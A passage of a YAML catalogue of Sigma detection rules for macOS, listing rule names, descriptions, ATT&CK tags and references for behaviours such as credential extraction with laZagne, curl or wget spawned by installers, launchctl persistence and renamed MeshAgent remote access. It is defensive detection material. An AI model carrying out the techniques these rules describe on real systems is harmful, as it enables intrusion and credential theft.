  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.md#atomic-test-2---create-local-account-with-admin-privileges---macos
  - https://ss64.com/osx/dscl.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 5d0fdb62-f225-42fb-8402-3dfe64da468a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_dseditgroup_add_to_admin_group.yml
  name: User Added To Admin Group Via DseditGroup
  description: Detects attempts to create and/or add an account to the admin group,
    thus granting admin privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.003
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1078.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.003/T1078.003.md#atomic-test-5---add-a-newexisting-user-to-the-admin-group-using-dseditgroup-utility---macos
  - https://ss64.com/osx/dseditgroup.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 821bcf4d-46c7-4b87-bc57-9509d3ba7c11
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_dsenableroot_enable_root_account.yml
  name: Root Account Enable Via Dsenableroot
  description: Detects attempts to enable the root account via "dsenableroot"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1078.001
  - T1078.003
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1078
  - attack.t1078.001
  - attack.t1078.003
  - attack.initial-access
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1078.003/T1078.003.md
  - https://github.com/elastic/detection-rules/blob/4312d8c9583be524578a14fe6295c3370b9a9307/rules/macos/persistence_enable_root_account.toml
  - https://ss64.com/osx/dsenableroot.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 089dbdf6-b960-4bcc-90e3-ffc3480c20f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_file_and_directory_discovery.yml
  name: File and Directory Discovery - MacOS
  description: Detects usage of system utilities to discover files and directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1083/T1083.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: 53b1b378-9b06-4992-b972-dde6e423d2b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_find_cred_in_files.yml
  name: Credentials In Files
  description: Detecting attempts to extract passwords with grep and laZagne
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.001/T1552.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60f1ce20-484e-41bd-85f4-ac4afec2c541
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_gui_input_capture.yml
  name: GUI Input Capture - macOS
  description: Detects attempts to use system dialog prompts to capture user credentials
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056.002
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1056.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.002/T1056.002.md
  - https://scriptingosx.com/2018/08/user-interaction-from-bash-scripts/
  false_positives:
  - Legitimate administration tools and activities
  notes: ''
- detection_id: 1cf98dc2-fcb0-47c9-8aea-654c9284d1ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml
  name: Disk Image Creation Via Hdiutil - MacOS
  description: Detects the execution of the hdiutil utility in order to create a disk
    image.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://www.loobins.io/binaries/hdiutil/
  - https://www.sentinelone.com/blog/from-the-front-linesunsigned-macos-orat-malware-gambles-for-the-win/
  - https://ss64.com/mac/hdiutil.html
  false_positives:
  - Legitimate usage of hdiutil by administrators and users.
  notes: ''
- detection_id: bf241472-f014-4f01-a869-96f99330ca8c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml
  name: Disk Image Mounting Via Hdiutil - MacOS
  description: Detects the execution of the hdiutil utility in order to mount disk
    images.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  - T1566.001
  tags:
  - attack.initial-access
  - attack.collection
  - attack.t1566.001
  - attack.t1560.001
  time_window: ''
  references:
  - https://www.loobins.io/binaries/hdiutil/
  - https://www.sentinelone.com/blog/from-the-front-linesunsigned-macos-orat-malware-gambles-for-the-win/
  - https://ss64.com/mac/hdiutil.html
  false_positives:
  - Legitimate usage of hdiutil by administrators and users.
  notes: ''
- detection_id: e0cfaecd-602d-41af-988d-f6ccebb2af26
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_installer_susp_child_process.yml
  name: Suspicious Installer Package Child Process
  description: Detects the execution of suspicious child processes from macOS installer
    package parent process. This includes osascript, JXA, curl and wget amongst other
    interpreters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1059.007
  - T1071
  - T1071.001
  tags:
  - attack.t1059
  - attack.t1059.007
  - attack.t1071
  - attack.t1071.001
  - attack.execution
  - attack.command-and-control
  time_window: ''
  references:
  - https://redcanary.com/blog/clipping-silver-sparrows-wings/
  - https://github.com/elastic/detection-rules/blob/4312d8c9583be524578a14fe6295c3370b9a9307/rules/macos/execution_installer_package_spawned_network_event.toml
  false_positives:
  - Legitimate software uses the scripts (preinstall, postinstall)
  notes: ''
- detection_id: 2d5e7a8b-f484-4a24-945d-7f0efd52eab0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml
  name: System Information Discovery Using Ioreg
  description: 'Detects the use of "ioreg" which will show I/O Kit registry information.

    This process is used for system information discovery.

    It has been observed in-the-wild by calling this process directly or using bash
    and grep to look for specific strings.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/0373d78db6c3c0f6f6dcc409821bf89e1ad8c165d6f95c5c80ecdce2219627d7/behavior
  - https://www.virustotal.com/gui/file/4ffdc72d1ff1ee8228e31691020fc275afd1baee5a985403a71ca8c7bd36e2e4/behavior
  - https://www.virustotal.com/gui/file/5907d59ec1303cfb5c0a0f4aaca3efc0830707d86c732ba6b9e842b5730b95dc/behavior
  - https://www.trendmicro.com/en_ph/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
  false_positives:
  - Legitimate administrative activities
  notes: ''
- detection_id: 2316929c-01aa-438c-970f-099145ab1ee6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_jamf_susp_child.yml
  name: JAMF MDM Potential Suspicious Child Process
  description: Detects potential suspicious child processes of "jamf". Could be a
    sign of potential abuse of Jamf as a C2 server as seen by Typhon MythicAgent.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://github.com/MythicAgents/typhon/
  - https://www.zoocoup.org/casper/jamf_cheatsheet.pdf
  - https://docs.jamf.com/10.30.0/jamf-pro/administrator-guide/Components_Installed_on_Managed_Computers.html
  false_positives:
  - Legitimate execution of custom scripts or commands by Jamf administrators. Apply
    additional filters accordingly
  notes: ''
- detection_id: be2e3a5c-9cc7-4d02-842a-68e9cb26ec49
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_jamf_usage.yml
  name: JAMF MDM Execution
  description: 'Detects execution of the "jamf" binary to create user accounts and
    run commands. For example, the binary can be abused by attackers on the system
    in order to bypass security controls or remove application control polices.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://github.com/MythicAgents/typhon/
  - https://www.zoocoup.org/casper/jamf_cheatsheet.pdf
  - https://docs.jamf.com/10.30.0/jamf-pro/administrator-guide/Components_Installed_on_Managed_Computers.html
  false_positives:
  - Legitimate use of the JAMF CLI tool by IT support and administrators
  notes: ''
- detection_id: f1408a58-0e94-4165-b80a-da9f96cf6fc3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_jxa_in_memory_execution.yml
  name: JXA In-memory Execution Via OSAScript
  description: Detects possible malicious execution of JXA in-memory via OSAScript
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.002
  - T1059.007
  tags:
  - attack.t1059.002
  - attack.t1059.007
  - attack.execution
  time_window: ''
  references:
  - https://redcanary.com/blog/applescript/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ae9d710f-dcd1-4f75-a0a5-93a73b5dda0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_launchctl_execution.yml
  name: Launch Agent/Daemon Execution Via Launchctl
  description: Detects the execution of programs as Launch Agents or Launch Daemons
    using launchctl on macOS.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1543.001
  - T1543.004
  - T1569.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1569.001
  - attack.t1543.001
  - attack.t1543.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1569.001/T1569.001.md
  - https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/
  - https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/
  - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
  - https://www.loobins.io/binaries/launchctl/
  false_positives:
  - Legitimate administration activities is expected to trigger false positives. Investigate
    the command line being passed to determine if the service or launch agent are
    suspicious.
  notes: ''
- detection_id: ddf36b67-e872-4507-ab2e-46bda21b842c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_local_account.yml
  name: Local System Accounts Discovery - MacOs
  description: Detects enumeration of local systeam accounts on MacOS
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087.001
  tags:
  - attack.discovery
  - attack.t1087.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1087.001/T1087.001.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 89bb1f97-c7b9-40e8-b52b-7d6afbd67276
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_local_groups.yml
  name: Local Groups Discovery - MacOs
  description: Detects enumeration of local system groups
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.001
  tags:
  - attack.discovery
  - attack.t1069.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 84bae5d4-b518-4ae0-b331-6d4afd34d00f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_network_service_scanning.yml
  name: MacOS Network Service Scanning
  description: Detects enumeration of local or remote network services.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1046
  tags:
  - attack.discovery
  - attack.t1046
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1046/T1046.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: adc9bcc4-c39c-4f6b-a711-1884017bf043
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_network_sniffing.yml
  name: Network Sniffing - MacOs
  description: 'Detects the usage of tooling to sniff network traffic.

    An adversary may place a network interface into promiscuous mode to passively
    access data in transit over the network, or use span ports to capture a larger
    amount of data.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.discovery
  - attack.credential-access
  - attack.t1040
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 6d8a7cf1-8085-423b-b87d-7e880faabbdf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_nscurl_usage.yml
  name: File Download Via Nscurl - MacOS
  description: Detects the execution of the nscurl utility in order to download files.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://www.loobins.io/binaries/nscurl/
  - https://www.agnosticdev.com/content/how-diagnose-app-transport-security-issues-using-nscurl-and-openssl
  - https://gist.github.com/nasbench/ca6ef95db04ae04ffd1e0b1ce709cadd
  false_positives:
  - Legitimate usage of nscurl by administrators and users.
  notes: ''
- detection_id: 69483748-1525-4a6c-95ca-90dc8d431b68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_office_susp_child_processes.yml
  name: Suspicious Microsoft Office Child Process - MacOS
  description: Detects suspicious child processes spawning from microsoft office suite
    applications such as word or excel. This could indicates malicious macro execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.002
  - T1137.002
  - T1204.002
  tags:
  - attack.execution
  - attack.persistence
  - attack.t1059.002
  - attack.t1137.002
  - attack.t1204.002
  time_window: ''
  references:
  - https://redcanary.com/blog/applescript/
  - https://objective-see.org/blog/blog_0x4B.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b9d9b652-d8ed-4697-89a2-a1186ee680ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_osacompile_runonly_execution.yml
  name: OSACompile Run-Only Execution
  description: Detects potential suspicious run-only executions compiled using OSACompile
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.002
  tags:
  - attack.t1059.002
  - attack.execution
  time_window: ''
  references:
  - https://redcanary.com/blog/applescript/
  - https://ss64.com/osx/osacompile.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 234dc5df-40b5-49d1-bf53-0d44ce778eca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_payload_decoded_and_decrypted.yml
  name: Payload Decoded and Decrypted via Built-in Utilities
  description: Detects when a built-in utility is used to decode and decrypt a payload
    after a macOS disk image (DMG) is executed. Malware authors may attempt to evade
    detection and trick users into executing malicious code by encoding and encrypting
    their payload and placing it in a disk image file. This behavior is consistent
    with adware or malware families such as Bundlore and Shlayer.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1140
  - T1204
  tags:
  - attack.t1059
  - attack.t1204
  - attack.execution
  - attack.t1140
  - attack.defense-evasion
  - attack.s0482
  - attack.s0402
  time_window: ''
  references:
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-5d42c3d772e04f1e8d0eb60f5233bc79def1ea73105a2d8822f44164f77ef823
  false_positives:
  - Unknown
  notes: ''
- detection_id: 65d506d3-fcfe-4071-b4b2-bcefe721bbbb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_persistence_via_plistbuddy.yml
  name: Potential Persistence Via PlistBuddy
  description: Detects potential persistence activity using LaunchAgents or LaunchDaemons
    via the PlistBuddy utility
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.001
  - T1543.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1543.001
  - attack.t1543.004
  time_window: ''
  references:
  - https://redcanary.com/blog/clipping-silver-sparrows-wings/
  - https://www.manpagez.com/man/8/PlistBuddy/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 22c45af6-f590-4d44-bab3-b5b2d2a2b6d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_remote_access_tools_meshagent_arguments.yml
  name: Remote Access Tool - Potential MeshAgent Execution - MacOS
  description: 'Detects potential execution of MeshAgent which is a tool used for
    remote access.

    Historical data shows that threat actors rename MeshAgent binary to evade detection.

    Matching command lines with the ''--meshServiceName'' argument can indicate that
    the MeshAgent is being used for remote access.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.huntress.com/blog/know-thy-enemy-a-novel-november-case-on-persistent-remote-access
  - https://thecyberexpress.com/ukraine-hit-by-meshagent-malware-campaign/
  - https://wazuh.com/blog/how-to-detect-meshagent-with-wazuh/
  - https://www.security.com/threat-intelligence/medusa-ransomware-attacks
  false_positives:
  - Environments that legitimately use MeshAgent
  notes: ''
- detection_id: bd3b5eaa-439d-4a42-8f35-a49f5c8a2582
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_remote_access_tools_renamed_meshagent_execution.yml
  name: Remote Access Tool - Renamed MeshAgent Execution - MacOS
  description: 'Detects the execution of a renamed instance of the Remote Monitoring
    and Management (RMM) tool, MeshAgent.

    RMM tools such as MeshAgent are commonly utilized by IT administrators for legitimate
    remote support and system management.

    However, malicious actors may exploit these tools by renaming them to bypass detection
    mechanisms, enabling unauthorized access and control over compromised systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.defense-evasion
  - attack.t1219.002
  - attack.t1036.003
  time_window: ''
  references:
  - https://www.huntress.com/blog/know-thy-enemy-a-novel-november-case-on-persistent-remote-access
  - https://thecyberexpress.com/ukraine-hit-by-meshagent-malware-campaign/
  - https://wazuh.com/blog/how-to-detect-meshagent-with-wazuh/
  - https://www.security.com/threat-intelligence/medusa-ransomware-attacks
  false_positives:
  - Unknown
  notes: ''
- detection_id: f459ccb4-9805-41ea-b5b2-55e279e2424a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_remote_access_tools_teamviewer_incoming_connection.yml
  name: Remote Access Tool - Team Viewer Session Started On MacOS Host
  description: 'Detects the command line executed when TeamViewer starts a session
    started by a remote host.

    Once a connection has been started, an investigator can verify the connection
    details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate usage of TeamViewer
  notes: ''
- detection_id: 10227522-8429-47e6-a301-f2b2d014e7ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_remote_system_discovery.yml
  name: Macos Remote System Discovery
  description: Detects the enumeration of other remote systems.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  tags:
  - attack.discovery
  - attack.t1018
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 7c3b43d8-d794-47d2-800a-d277715aa460
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_schedule_task_job_cron.yml
  name: Scheduled Cron Task/Job - MacOs
  description: Detects abuse of the cron utility to perform task scheduling for initial
    or recurring execution of malicious code. Detection will focus on crontab jobs
    uploaded from the tmp folder.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.003
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1053.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.003/T1053.003.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 0877ed01-da46-4c49-8476-d49cdd80dfa7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_screencapture.yml
  name: Screen Capture - macOS
  description: Detects attempts to use screencapture to collect macOS screenshots
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1113/T1113.md
  - https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/collection/osx/screenshot.py
  false_positives:
  - Legitimate user activity taking screenshots
  notes: ''
- detection_id: 0ed75b9c-c73b-424d-9e7d-496cd565fbe0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_security_software_discovery.yml
  name: Security Software Discovery - MacOs
  description: Detects usage of system utilities (only grep for now) to discover security
    software discovery
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1518.001/T1518.001.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: b6e2a2e3-2d30-43b1-a4ea-071e36595690
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_space_after_filename.yml
  name: Space After Filename - macOS
  description: Detects attempts to masquerade as legitimate files by adding a space
    to the end of the filename.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.006
  tags:
  - attack.defense-evasion
  - attack.t1036.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1036.006/T1036.006.md
  false_positives:
  - Mistyped commands or legitimate binaries named to match the pattern
  notes: ''
- detection_id: 7f2bb9d5-6395-4de5-969c-70c11fbe6b12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_split_file_into_pieces.yml
  name: Split A File Into Pieces
  description: Detection use of the command "split" to split files into parts and
    possible transfer.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1030
  tags:
  - attack.exfiltration
  - attack.t1030
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1030/T1030.md
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: 0250638a-2b28-4541-86fc-ea4c558fa0c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_susp_browser_child_process.yml
  name: Suspicious Browser Child Process - MacOS
  description: Detects suspicious child processes spawned from browsers. This could
